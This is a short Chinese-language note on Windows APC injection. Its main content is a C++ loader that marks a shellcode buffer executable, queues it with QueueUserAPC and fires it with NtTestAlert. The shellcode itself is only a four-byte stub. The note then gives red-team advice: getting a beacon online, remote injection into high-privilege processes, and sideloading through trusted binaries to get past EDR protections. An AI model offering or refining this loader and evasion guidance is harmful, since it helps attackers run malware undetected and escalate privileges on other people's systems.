## APC机制简介
![[image-49.png]]
### 线程的异步执行
![[image-51.png]]
### APC队列
![[image-52.png]]
![[image-53.png]]


## APC注入原理
![[image-50.png]]

#示例代码
```cpp
#include <windows.h>
#include <stdio.h>

unsigned char sc[] = "\xfc\x48\x83\xe4";
typedef DWORD(WINAPI* pNtTestAlert)();
void main() {
// 修改 shellcode 所在内存区域的保护属性，允许执行
DWORD oldProtect;
VirtualProtect((LPVOID)sc, sizeof(sc), PAGE_EXECUTE_READWRITE, &oldProtect);
/*获取NtTestAlert函数地址, 因为它是一个内部函数.无法直接通过函数名调用
这个函数用于检查当前线程的 APC（Asynchronous Procedure Call，异步过程调用）队列，如果队列中有挂起的用户模式 APC 请求，NtTestAlert 将触发它们的执行*/
pNtTestAlert NtTestAlert = (pNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
// 向当前线程的异步过程调用(APC)队列添加一个执行shellcode的任务
QueueUserAPC((PAPCFUNC)(PTHREAD_START_ROUTINE)(LPVOID)sc, GetCurrentThread(), NULL);
//调用NtTestAlert，触发 APC 队列中的任务执行（即执行 shellcode）
NtTestAlert();
}
```

1. 现代EDR对`QueueUserAPC`函数的监控（hook）
2. 上述代码采用了一个函数的执行来让APC队列处于警告状态以通过回调函数执行队列中的shellcode代码
3. 上述代码的作用很明显就是对当前线程（一般是主线程）的APC队列添加一个执行shellcode的任务，然后触发执行
4. 属于在当前进程中执行shellcdoe的一种执行方式，一定能上线但是权限一般就是低权限，<mark style="background: #FF5582A6;">可以尝试远程的APC注入</mark>注入高权限的进程中。由于edr的进程保护，所以<mark style="background: #FF5582A6;">高信誉白加黑然后再利用远程的注入以提高权限是可行的方案之一</mark>。